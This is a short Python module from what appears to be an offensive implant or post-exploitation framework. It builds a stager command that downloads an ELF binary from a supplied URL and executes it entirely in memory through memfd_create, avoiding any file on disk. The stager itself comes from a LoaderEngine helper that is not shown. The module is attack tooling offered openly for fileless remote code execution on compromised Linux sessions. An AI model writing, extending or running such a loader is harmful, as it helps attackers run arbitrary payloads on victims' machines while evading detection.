"""
modules/inject_python.py — Linux In-Memory ELF Injection Module

Generates a Python command that uses memfd_create to load and execute
an ELF binary entirely from memory (no file drop).
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from loader_engine import LoaderEngine

MODULE_INFO = {
    "name": "inject_python",
    "description": "memfd_create ELF loader (Linux, in-memory)",
    "author": "Hider",
    "platform": "linux",
}


def run(session, args):
    """
    args[0] = URL to the ELF binary
    """
    if not args or len(args) < 1:
        return "[!] Usage: inject_python <elf_url>"
    url = args[0]
    return LoaderEngine.bash_memfd_stager(url)
